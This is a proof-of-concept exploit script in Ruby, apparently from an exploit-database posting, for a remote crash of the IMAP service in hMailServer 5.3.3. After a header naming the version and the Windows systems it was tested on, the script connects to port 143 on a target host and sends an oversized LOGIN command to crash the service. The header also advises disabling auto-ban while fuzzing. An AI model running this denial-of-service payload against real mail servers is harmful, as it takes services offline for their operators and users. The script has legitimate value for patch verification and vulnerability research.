# Exploit Title: hMailServer 5.3.3 IMAP Remote Crash PoC
# Date: 10/27/2012
# Vendor Homepage: http://hmailserver.com
# Software Link: http://www.hmailserver.com/index.php?page=background_download_file&downloadid=207
# Version: hMailServer 5.3.3 - Build 1879
# Tested on:
#	- hMailServer 5.3.3 with default settings
#	- Reliably corruption makes IMAP service inaccessible on WIN XP SP2 and WIN 2K3R2 SP2
#	- Unreliable corruption makes all services (SMTP, IMAP, and POP) inaccessible on WIN 2K8R2 SP1
#
# Note: Disable "Auto-ban" in the hMailServer Admin console if performing additional fuzzing.

#!/usr/bin/ruby

require 'socket'

s = TCPSocket.open(ARGV[0], 143)

cmd = "a LOGIN "
address = "A" * 32765
password = " AAAAAAAA\r\n"
logout = "a LOGOUT\r\n"

pkt = cmd
pkt << address
pkt << password
pkt << logout

s.write(pkt)

while resp = s.gets
	p resp
end

s.close
